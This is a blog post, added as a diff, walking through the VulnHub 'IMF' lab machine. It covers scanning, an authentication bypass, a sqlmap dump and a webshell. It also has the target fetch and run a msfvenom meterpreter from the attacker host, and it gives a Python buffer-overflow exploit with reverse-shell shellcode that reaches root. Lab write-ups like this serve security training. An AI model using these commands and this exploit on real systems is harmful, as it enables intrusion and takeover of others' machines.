@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>m4l1c3.github.io</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://m4l1c3.github.io/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://m4l1c3.github.io/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;atom.xml">
+                                <span itemprop="name">Feed
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">imf</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>8 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2016-11-24
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <p>##Finding machine on the network:</p>
+<p>##Nmap</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">nmap -sn 172.16.161.129/24
+</code></pre>
+<p>Scan for hosts on my local network which gave me a machine named &quot;imf&quot;</p>
+<p>Now to run nmap on the machine itself:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">nmap -Pn -oA imf-nmap-results -p 0-65525 172.16.161.129
+</code></pre>
+<p>Looks like port 80 is open.</p>
+<p>After clicking through the pages on the site and viewing their sources I found this:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><!-- flag1{YWxsdGhlZmlsZXM==} -->
+</code></pre>
+<p>The first flag, having a = at the end looks base64 encoded.</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">echo YWxsdGhlZmlsZXM== | base64 -d
+</code></pre>
+<p>returns: allthefiles</p>
+<p>Something I noticed on the contact page was some random weird named js files:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><script src="js/ZmxhZzJ7YVcxbVl.js"></script>
+<script src="js/XUnRhVzVwYzNS.js"></script>
+<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
+</code></pre>
+<p>Those all might combine into a base64 string, lets check it out</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -D
+</code></pre>
+<p>which  returns: flag2{aW1mYWRtaW5pc3RyYXRvcg==}</p>
+<p>after running:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -D
+</code></pre>
+<p>I get:</p>
+<p>imfadministrator</p>
+<p>I tried browsing to: http://172.16.161.129/imfadministrator</p>
+<p>Loads up a login page, upon viewing the page source I find:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+</code></pre>
+<p>I remembered seeing emails on the contact page, went page and sure enough roger is a user, rmichaels is his email.</p>
+<p>Trying the user it seems the user is valid.</p>
+<p>After some googling, looks like there is a potential authentication type conversion that might get us around authentication.  Looking at a post changing the type of the data that is received server side could bypass authentication.  Intercepting the HTTP post with burp and changing pass to pass[], this ends up sending an array down to the server instead of a string, improper handling of the input must be how we can get past it.  Once the post is forwarded another flag: flag3{Y29udGludWVUT2Ntcw==} which decodes to: continueTOcms</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">sqlmap --url http://172.16.161.129/imfadministrator/cms.php?pagename=home --threads 5 --level 5 --cookie="PHPSESSID=phpsessionid" --dbms=MYSQL --dump
+</code></pre>
+<p>Important to remember the last two parameters, I missed these originally and totally didn't get some output for moving forward from the command line.</p>
+<p>Another flag: flag4{dXBsb2Fkcjk0Mi5waHA=} which decodes to: uploadr942.php</p>
+<p>flag5{YWdlbnRzZXJ2aWNlcw==} which decodes to: agentservices</p>
+<p>Running ps -A through the webshell created to get flag5 I'm able to see all the processes running on the remote machine.  One item that loks interesting is knockd, usually this would indicate that a port knocking sequence exists to open a service up to the public.</p>
+<p>Running: netstat -vatn shows a list of the processes listening on TCP, 7788 and 22 look interesting</p>
+<p>Trying to knock the default ports (7000 8000 9000)</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">for x in 7000 8000 9000; do nmap -T4 -p $x 192.168.1.20;done;
+</code></pre>
+<p>No luck though when trying to hit the interesting ports.</p>
+<p>Trying to hit port 7788:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=nc localhost 7788
+</code></pre>
+<p>I get a little shell app. Given that we are investigating &quot;agentservice&quot; I do a find on agent:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22(asterisk)agent%22
+</code></pre>
+<p>Which found:
+/etc/xinetd.d/agent</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=cat%20/etc/xinetd.d/agent
+</code></pre>
+<p>Gets:</p>
+<pre data-lang="nginx" class="language-nginx "><code class="language-nginx" data-lang="nginx"># description: The agent server serves agent sessions
+# unencrypted agentid for authentication.
+service agent
+{
+       flags          = REUSE
+       socket_type    = stream
+       wait           = no
+       user           = root
+       server         = /usr/local/bin/agent
+       log_on_failure += USERID
+       disable        = no
+       port           = 7788
+}
+</code></pre>
+<p>Looks like /usr/local/bin/agent is a service running.</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl -v http://172.16.161.1.129/imfadministrator/uploads/c59ca80d5d76.gif?c=ls%20-latr%20/usr/local/bin/agent
+
+-rwxr-xr-x 1 root root 11896 Oct 12 22:39 /usr/local/bin/agent
+</code></pre>
+<p>The service runs as root, possibly a way in</p>
+<p>In order to get a look at the binary I base64 encoded the file contents and saved it to a file locally:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=base64%20-w%200%20/usr/local/bin/agent
+</code></pre>
+<p>Then decoded it locally:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">cat agentservice | base64 -d >> agentservicebinary
+</code></pre>
+<p>and finally decompiled the binary here: https://retdec.com/decompilation-run/</p>
+<p>On line 37 it looks like the value: 0x2ddd984 assigns 48093572 to an int32_t variable that is used for checking if an agent's ID (passed into executable as a parameter is equal to 48093572), looks like a broken hard-coded authentication.</p>
+<p>Also, I used this to convert the hex to an int:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">echo $((0x2ddd984))
+</code></pre>
+<p>gave me: 48093572.</p>
+<p>Next I create a meterpreter for reverse_tcp handling using msfvenom:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.161.128 LPORT=4444 -f elf > imf-meterpreter
+</code></pre>
+<p>Now we need to get the file onto the remote machine, wget is probably the easiest.</p>
+<p>Setting up a simple web server to host the file:</p>
+<p>python -m SimpleHTTPServer</p>
+<p>Now run wget on the remote machine:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=wget%20http://172.16.61.128:8000/imf-meterpreter
+</code></pre>
+<p>Make the meterpreter runnable:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=chmod%20777%20imf-meterpreter
+curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=chmod%20a+x%20imf-meterpreter
+</code></pre>
+<p>Now we have a way to interact with the remote machine in metasploit</p>
+<p>in MSF run:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 172.16.161.128
+set LPORT 4444
+run
+</code></pre>
+<p>Finally, run the script:</p>
+<p>curl -v http://172.16.161.129/imfadministrator/uploads/c59ca80d5d76.gif?c=.%2Fimf-meterpreter</p>
+<p>Once metrepreter prompt is up setup port forwarding for the service:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">portfwd add -l 7788 -p 7788 -r 127.0.0.1
+</code></pre>
+<p>Open another terminal and hit the service:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">nc localhost 7788
+</code></pre>
+<p>Now we can interact with the service its time to look at the source again to find a way to exploit.</p>
+<p>Combing through the source on line 226:</p>
+<pre data-lang="c" class="language-c "><code class="language-c" data-lang="c">gets((char *)&str);*
+</code></pre>
+<p>This reads user input, however the size of the input isn't defined, looks like a possible buffer overflow, basically we're passing in more information that the command is going to properly handle and extending the application's memory outside of it's contextual boundary causing an error to occur.</p>
+<p>After doing some reading on ways to exploit the buffer overflow I stumbled onto the idea of return oriented programming, tl;dr; Its a way to execute a buffer overflow when defense mechanisms like code-signing and non-executable memory are employed.  In this technique you can send machine language that is already in the machine's memory, whether through the program being exploited itself or other shared libraries.  When these pieces when combined can be used to perform actions on the remote machine.</p>
+<p>I was able to upload the agent binaries we got earlier to ropshell.com which analyzes the compiled code for items in memory that can be used in an exploit, in this case: call eax.</p>
+<p>Ater reading through some reference docs for assembly, specifically x86 I have surmised that with our goal being getting a root shell by escaping the 'agent' service causing a buffer overflow to occur and running 'call eax.'  In doing so we would be executing whatever is in the eax register.  Another things we're going to need to do is make sure that our exploit is going to be at the address eax is referencing at runtime.  I'm basing this on using the eax register in the processor can be used to execute code held at a memory address to circumvent normal program execution, in this case getting a root shell.</p>
+<p>Now to generate a buffer to overflow using msfvenom:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.161.128 LPORT=4445 -f python -b "\x00\x0a\x0d"
+</code></pre>
+<p>This command will give up the buffer overflow shellcode for creating a reverse_tcp shell with my machine as the host and 4445 as the portand to exclude newline characters from the output.</p>
+<p>Next write up a python script for using the exploit:</p>
+<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">import socket
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(('localhost', 7788))
+client.recv(512)
+client.send("48093572\n")
+client.recv(512)
+client.send("3\n")
+client.recv(512)
+
+#shellcode from msfvenom
+
+buf =  ""
+buf += "\xd9\xc2\xba\xa6\xf9\x71\x23\xd9\x74\x24\xf4\x58\x2b"
+buf += "\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x4e\x05\x93"
+buf += "\xd6\xbf\x2d\xa3\xfa\xec\x92\x1f\x97\x10\x9c\x41\xd7"
+buf += "\x72\x53\x01\x8b\x23\xdb\x3d\x61\x53\x52\x3b\x80\x3b"
+buf += "\xc9\xab\xd3\x3b\x79\xce\x13\x2a\x27\x47\xf2\xfc\xb1"
+buf += "\x07\xa4\xaf\x8e\xab\xcf\xae\x3c\x2b\x9d\x58\xd1\x03"
+buf += "\x51\xf0\x45\x73\xba\x62\xff\x02\x27\x30\xac\x9d\x49"
+buf += "\x04\x59\x53\x09"
+#padding
+
+buf += "A" * (168 - len(buf))
+
+#call eax gadget
+buf += "\x63\x85\x04\x08\n"
+
+client.send(buf)
+
+</code></pre>
+<p>Now start ncat for the exploit:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">ncat -lv 172.16.161.128 4445
+</code></pre>
+<p>Then run the script: python payload.py</p>
+<p>We're in!</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">cd /root
+cat Flag6.txt | base64 -d yeilds: ~GhostProtocols
+cat TheEnd.txt outputs the final you won thing.
+</code></pre>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by m4l1c3
+                
+                
+                    
+                    in <a href="https://m4l1c3.github.io/categories/vulnhub/">vulnhub</a>
+                
+                
+                    and tagged
+                    
+                        <a href="https://m4l1c3.github.io/tags/vulnerable-machine/">vulnerable-machine</a>
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
